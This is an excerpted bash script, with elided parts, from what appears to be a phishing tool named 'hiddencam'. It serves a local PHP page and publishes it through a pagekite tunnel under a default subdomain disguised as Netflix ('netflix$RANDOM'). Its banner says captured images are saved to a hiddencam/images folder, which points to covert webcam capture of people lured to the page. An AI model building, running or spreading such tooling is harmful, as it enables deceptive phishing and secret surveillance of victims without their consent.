...
clear
banner
printf "\n\e[1;32m\t  Read This Very Carefully !\e[0m\n\n"
...
printf " \e[1;31m[\e[1;37m04\e[1;31m]\e[1;33m Images will save at \e[1;36mhiddencam/images \e[1;33mfolder.\e[0m\n\n"
printf "\e[0m\n"
...
cd .www/ && php -S localhost:5555 > /dev/null 2>&1 &

if [[ $pagekite_subdomain_resp == true ]]; then
sleep 1
python2 .www/.pagekite --clean --signup 5555 $pagekite_subdomain.pagekite.me
else
sleep 1
python2 .www/.pagekite --clean --signup 5555 netflix$RANDOM.pagekite.me
fi
